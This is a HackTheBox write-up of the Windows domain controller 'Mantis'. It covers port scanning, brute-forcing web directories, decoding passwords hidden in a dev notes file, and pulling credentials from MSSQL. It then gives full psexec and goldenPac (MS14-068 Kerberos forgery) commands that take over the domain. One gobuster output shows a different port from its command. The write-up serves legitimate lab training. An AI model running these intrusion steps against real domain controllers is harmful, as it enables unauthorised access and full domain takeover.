---
layout: post
title: "HackTheBox - Mantis writeup"
subtitle: "~ Walkthrough of Mantis machine from HackTheBox ~"
date: 2018-02-25
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---
<img src="/img/blog/htb-mantis/htb-mantis-00.png" width="417" height="136">
# Introduction
It has been a long time since my last blog for sure! Close to 4 months! Well, time to change that, I guess. This blog will describe steps needed to *pwn* the Mantis machine from [HackTheBox](https://www.hackthebox.eu/){:target="_blank"} labs. Hope you enjoy! <!--more-->

***

# Scanning & Enum

Start out by obtaining the IP (**10.10.10.52**) of the Mantis machine and nmap it:
```console
root@EdgeOfNight:~/Desktop/Writeups/Mantis/Scans# nmap -A -sS --script vuln -T4 10.10.10.52 

Starting Nmap 7.50 ( https://nmap.org ) at 2018-02-24 08:31 CST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.52
Host is up (0.040s latency).
Not shown: 979 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2018-02-24 14:32:47Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_sslv2-drown: 
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp filtered waste
|_sslv2-drown: 
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      http://osvdb.org/113251
|_sslv2-drown: 
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_sslv2-drown: 
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.50%E=4%D=2/24%OT=53%CT=1%CU=42325%PV=Y%DS=2%DC=T%G=Y%TM=5A917AB
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%CI=I%TS=7)OPS(O1=M54DNW
OS:8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M5
OS:4DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%
OS:T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   35.44 ms 10.10.14.1
2   33.17 ms 10.10.10.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 872.47 seconds

```
> Tip: You can use "--script vuln" to try and run every "vuln" testing script in nmap. It's very loud though so I'd advise not to use it if your main goal is to stay hidden."

Right from the bat we can see multiple interesting services - `Kerberos(88), LDAP(389), MSSQL(1433), IIS(8080) and ?Wasted (1337)?`. Let's go through some of them.

### - Wasted (port: 1337)
This port immediately grabbed my attention! It's sort of an infosec [pun](https://www.urbandictionary.com/define.php?term=1337){:target="_blank"} one could say :). Upon accessing the port we are presented with a web server:

<a href="/img/blog/htb-mantis/htb-mantis-01.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-01.png"></a>

Usual scans like nikto didn't yield much. Time to brute the directories:
```console
root@EdgeOfNight:~/Desktop/Writeups/Mantis/Scans# gobuster -u http://10.10.10.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.52:1337/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://10.10.10.52:8080/secure_notes (Status: 200)
```
*Secure_notes* is a directory with listing enabled. Its content can be found in the image below:
<a href="/img/blog/htb-mantis/htb-mantis-02.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-mantis/htb-mantis-02.png"></a>

Unfortunately web.config doesn't lead anywhere, it's just an empty page. However dev_notes do:
<a href="/img/blog/htb-mantis/htb-mantis-03.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-03.png"></a>

Notice two alerting things:
1. The actual filename - **dev_notes_NmQyNDI0Nz...I2NDIx.txt.txt**
2. The scrollbar on the right indicates we can still go down and view possible hidden content.

Regarding point 1 - the filename looks suspicious. 2 file extensions and "random" gibberish as the name. If you look closely though, you can spot that the name is base64 encoded. Proceed to decode it:

```console
root@EdgeOfNight:~# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
6d2424716c5f53405f504073735730726421`
```

That looks familiar as well, doesn't it? It's hex! Aaaand it decodes to `m$$ql_S@_P@ssW0rd!`. Wonderful! Onto the second point now. Simply scroll down the webpage.

<a href="/img/blog/htb-mantis/htb-mantis-04.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-04.png"></a>

```console
Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```
Secure format? Binary? These two don't go together. By decoding the binary string above we are present with another password: `@dm!n_P@ssW0rd!`. 

So far we have gathered two passwords:
* m$$ql_S@_P@ssW0rd! - Probably the MSSQL credentials
* @dm!n_P@ssW0rd! - OrchardCMS admin credentials

Let's save them and continue enumeration of other services.

### - IIS (port: 8080)

Accessing port 8080 we get this webpage:<br>
<a href="/img/blog/htb-mantis/htb-mantis-05.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-05.png"></a>
*OrchardCMS*... Interesting. If you recall correctly, we discovered login credentials in the previous section. Let's try and find the administrator page.
```console
root@EdgeOfNight:~/Desktop/Writeups/Mantis/Scans# gobuster -u http://10.10.10.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.52:8080/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://10.10.10.52:8080/archive (Status: 200)
http://10.10.10.52:8080/blogs (Status: 200)
http://10.10.10.52:8080/admin (Status: 302)
http://10.10.10.52:8080/tags (Status: 200)
http://10.10.10.52:8080/Archive (Status: 200)
http://10.10.10.52:8080/pollArchive (Status: 200)
```

`http://10.10.10.52:8080/admin (Status: 302)` - use `admin:@dm!n_P@ssW0rd!` credentials to login.
<a href="/img/blog/htb-mantis/htb-mantis-06.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-06.png"></a>
<a href="/img/blog/htb-mantis/htb-mantis-07.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-07.png"></a>

Unfortunately I didn't find any useful information on here. Might as well be a rabbit hole...

### - MSSQL(port: 1433)
This one is really simple. Just use the previously discovered credentials and snoop through the database tables! I used `DBeaver` for this purpose.
> DBeaver can be installed with apt: apt-get install dbeaver 

Add a new connection:
<a href="/img/blog/htb-mantis/htb-mantis-08.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-08.png"></a>

Navigate through tables until you reach `UserPartRecord` (part of *orcharddb*) and view the data:
<a href="/img/blog/htb-mantis/htb-mantis-09.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-mantis/htb-mantis-09.png"></a>

A new username and a **cleartext** password! 
* james@htb.local
* J@m3s_P@ssW0rd!

***

# Exploitation

2 main methods!
* psexec
* Kerberos golden ticket forging - MS14-068 

Instead of exploiting straight away you can use various tools like `rpcclient` or `smbclient` to gather some information. Trying to keep the blog short though, so let's skip that.

### - Psexec
I didn't notice this attack vector in my first attempt, BUT kudos to [ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA){:target="_blank"} for showing this method in his video! I highly advise you check his channel out. This command will use psexec and successfully exploit the machine:
```console
/usr/share/doc/python-impacket/examples/psexec.py htb.local/james@10.10.10.52
``` 

<a href="/img/blog/htb-mantis/htb-mantis-10.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-mantis/htb-mantis-10.png"></a>

### - Kerberos: MS14-068 
For the sake of keeping this blog post short I won't describe the *"science"* behind this vulnerability. It's rather complex. Check the links below if you are interested in the actual explanation. 

* https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/
* https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/
* https://adsecurity.org/?p=676

For exploiting this particular vulnerability we can use impacket github [repo](https://github.com/CoreSecurity/impacket){:target="_blank"} & its [goldenPac.py](https://github.com/CoreSecurity/impacket/blob/master/examples/goldenPac.py){:target="_blank"} exploit. Install it:

```console
root@EdgeOfNight:~/Documents/Github# git clone https://github.com/CoreSecurity/impacket && cd impacket && pip install .
Cloning into 'impacket'...
remote: Counting objects: 12730, done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 12730 (delta 12), reused 19 (delta 6), pack-reused 12692
Receiving objects: 100% (12730/12730), 4.28 MiB | 1.06 MiB/s, done.
Resolving deltas: 100% (9620/9620), done.
Collecting ldap3==2.2.3 (from -r requirements.txt (line 1))
  Downloading ldap3-2.2.3-py2.py3-none-any.whl (365kB)
    100% |████████████████████████████████| 368kB 1.1MB/s 
Collecting pyasn1>=0.2.3 (from -r requirements.txt (line 2))
  Downloading pyasn1-0.4.2-py2.py3-none-any.whl (71kB)
    100% |████████████████████████████████| 71kB 968kB/s 
Requirement already satisfied: pycrypto>=2.6.1 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 3))
Requirement already satisfied: pyOpenSSL>=0.13.1 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 4))
Installing collected packages: pyasn1, ldap3
  Found existing installation: pyasn1 0.1.9
    Not uninstalling pyasn1 at /usr/lib/python2.7/dist-packages, outside environment /usr
Successfully installed ldap3-2.2.3 pyasn1-0.4.2
Installing collected packages: impacket
  Found existing installation: impacket 0.9.15
    Not uninstalling impacket at /usr/lib/python2.7/dist-packages, outside environment /usr
  Running setup.py install for impacket ... done
Successfully installed impacket-0.9.16.dev0
```

Now run the exploit.
```console
root@EdgeOfNight:~/Documents/Github/impacket/examples# python goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james@mantis.htb.local
```
<a href="/img/blog/htb-mantis/htb-mantis-11.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-mantis/htb-mantis-11.png"></a>

### Congratulations!
***

# Conclusion
An amazing box! Would rate it as one of the better ones for sure. I've definitely learnt a lot while working on this masterpiece. To conclude, I'd love to thank [bitvijays](https://twitter.com/bitvijays){:target="_blank"} for helping me when I got stuck on the **goldenPac** part. 

~V3

